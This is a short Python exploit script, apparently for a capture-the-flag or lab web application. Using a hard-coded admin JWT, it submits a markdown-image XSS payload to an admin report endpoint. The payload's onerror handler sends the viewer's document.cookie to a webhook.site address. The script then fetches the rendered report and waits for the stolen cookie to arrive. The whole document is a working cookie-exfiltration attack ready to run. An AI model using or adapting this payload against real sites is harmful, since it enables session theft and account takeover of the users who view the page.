import re, requests, time

BASE    = "http://10.21.232.209:5000"
TOKEN   = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzg5NDkwNDM3fQ.KarNUeGjtp_s8c_vlciL5-i9HcC8D5VOqQXQs9FQftw"
WEBHOOK = "https://webhook.site/8d386683-14cf-4ec5-af3d-0419005d33d2"   # <-- your webhook
COOKIES = {"token": TOKEN}

payload = (
    '![x](url "`" onerror="this.src=\''
    + WEBHOOK + '?\'+document.cookie//`")'
)
print("payload   :", payload)

r = requests.post(f"{BASE}/admin/report", data={"content": payload},
                  cookies=COOKIES, timeout=5)
print("submit    : HTTP", r.status_code)

m = re.search(r'/report/([0-9a-f]{32})/view', r.text)
rid = m.group(1)
print("report id :", rid)
print("view url  :", f"{BASE}/report/{rid}/view")

v = requests.get(f"{BASE}/report/{rid}/view", timeout=5)
body = v.text.split("<h2>Report</h2>", 1)[1].split("</body>", 1)[0].strip()
print("rendered  :", body)
print()
print(f"[*] Watching for hit on {WEBHOOK} ...")